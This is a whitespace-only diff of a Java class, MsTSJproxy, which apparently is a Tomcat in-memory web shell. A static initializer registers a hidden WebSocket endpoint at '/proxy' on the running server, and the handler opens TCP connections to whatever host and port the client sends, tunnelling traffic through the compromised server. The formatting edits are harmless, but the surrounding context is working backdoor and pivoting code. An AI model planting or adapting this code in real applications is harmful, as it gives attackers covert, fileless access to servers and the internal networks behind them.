@@ -23,9 +23,9 @@ import java.util.concurrent.TimeUnit;
 public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuffer>, CompletionHandler<Integer, Session> {
 
     static {
-        String                path                  = "/proxy";
+        String path = "/proxy";
         WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
-        StandardRoot          standardroot          = (StandardRoot) webappClassLoaderBase.getResources();
+        StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
         if (standardroot == null) {
             Field field = null;
             try {
@@ -45,9 +45,9 @@ public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuf
                 e.printStackTrace();
             }
         }
-        StandardContext      standardContext = (StandardContext) standardroot.getContext();
-        ServerEndpointConfig configEndpoint  = ServerEndpointConfig.Builder.create(MsTSJproxy.class, path).build();
-        ServerContainer      container       = (ServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
+        StandardContext standardContext = (StandardContext) standardroot.getContext();
+        ServerEndpointConfig configEndpoint = ServerEndpointConfig.Builder.create(MsTSJproxy.class, path).build();
+        ServerContainer container = (ServerContainer) standardContext.getServletContext().getAttribute(ServerContainer.class.getName());
         try {
             container.addEndpoint(configEndpoint);
         } catch (Exception e) {
@@ -56,10 +56,10 @@ public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuf
 
     }
 
-    final   ByteBuffer                buffer = ByteBuffer.allocate(102400);
+    final ByteBuffer buffer = ByteBuffer.allocate(102400);
     long i = 0;
-    ByteArrayOutputStream                      baos = new ByteArrayOutputStream();
-    HashMap<String, AsynchronousSocketChannel> map  = new HashMap<String, AsynchronousSocketChannel>();
+    ByteArrayOutputStream baos = new ByteArrayOutputStream();
+    HashMap<String, AsynchronousSocketChannel> map = new HashMap<String, AsynchronousSocketChannel>();
     private Session session;
     private AsynchronousSocketChannel client = null;
 
@@ -71,8 +71,8 @@ public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuf
         buffer.clear();
         try {
             if (buffer.hasRemaining() && result >= 0) {
-                byte[]     arr = new byte[result];
-                ByteBuffer b   = buffer.get(arr, 0, result);
+                byte[] arr = new byte[result];
+                ByteBuffer b = buffer.get(arr, 0, result);
                 baos.write(arr, 0, result);
                 ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                 if (channel.isOpen()) {
@@ -82,8 +82,8 @@ public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuf
                 readFromServer(channel, client);
             } else {
                 if (result > 0) {
-                    byte[]     arr = new byte[result];
-                    ByteBuffer b   = buffer.get(arr, 0, result);
+                    byte[] arr = new byte[result];
+                    ByteBuffer b = buffer.get(arr, 0, result);
                     baos.write(arr, 0, result);
                     readFromServer(channel, client);
                 }
@@ -129,13 +129,13 @@ public class MsTSJproxy extends Endpoint implements MessageHandler.Whole<ByteBuf
                 client.write(z).get();
                 readFromServer(channel, client);
             } else if (i == 1) {
-                String                    values      = new String(z.array());
-                String[]                  array       = values.split(" ");
-                String[]                  addrarray   = array[1].split(":");
-                AsynchronousSocketChannel client      = AsynchronousSocketChannel.open();
-                int                       po          = Integer.parseInt(addrarray[1]);
-                InetSocketAddress         hostAddress = new InetSocketAddress(addrarray[0], po);
-                Future<Void>              future      = client.connect(hostAddress);
+                String values = new String(z.array());
+                String[] array = values.split(" ");
+                String[] addrarray = array[1].split(":");
+                AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
+                int po = Integer.parseInt(addrarray[1]);
+                InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
+                Future<Void> future = client.connect(hostAddress);
                 try {
                     future.get(10, TimeUnit.SECONDS);
                 } catch (Exception ignored) {
